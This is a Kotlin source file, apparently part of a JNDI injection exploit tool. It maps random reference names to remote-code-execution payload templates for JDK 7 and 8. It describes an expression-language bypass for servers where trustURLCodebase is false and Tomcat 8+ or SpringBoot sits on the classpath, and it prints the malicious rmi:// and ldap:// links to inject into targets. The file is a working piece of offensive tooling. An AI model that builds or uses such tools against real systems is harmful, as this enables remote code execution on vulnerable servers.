package util

import LDAP_PORT
import RMI_PORT
import org.apache.commons.lang3.RandomStringUtils


object Dict {
    // random index -> payload template
    val references = mapOf(
        randomRef() to "ExecTemplateJDK8",
        randomRef() to "ExecTemplateJDK7",
        randomRef() to "BypassByEL"
    )

    // payload template -> description
    val instructions = mapOf(
        "ExecTemplateJDK8" to "Build in ${"JDK 1.8".red()} whose trustURLCodebase is true",
        "ExecTemplateJDK7" to "Build in ${"JDK 1.7".red()} whose trustURLCodebase is true",
        "BypassByEL" to "Build in ${"JDK".red()} whose trustURLCodebase is false and have ${"Tomcat 8+".purple()} or ${"SpringBoot 1.2.x+".purple()} in classpath"
    )

    fun showMessage(addr: String) {
        println("----------------------------JNDI Links----------------------------")
        references.forEach { t, u ->
            println("Target environment(${instructions[u]}):")
            if (u.startsWith("Bypass")) {
                println("rmi://$addr:$RMI_PORT/$t")
            } else {
                println("rmi://$addr:$RMI_PORT/$t")
                println("ldap://$addr:$LDAP_PORT/$t")
            }
        }
        println()
    }

    private fun randomRef() = RandomStringUtils.randomAlphanumeric(6).lowercase()
}

fun main() {
    Dict.showMessage("127.0.0.1")
}
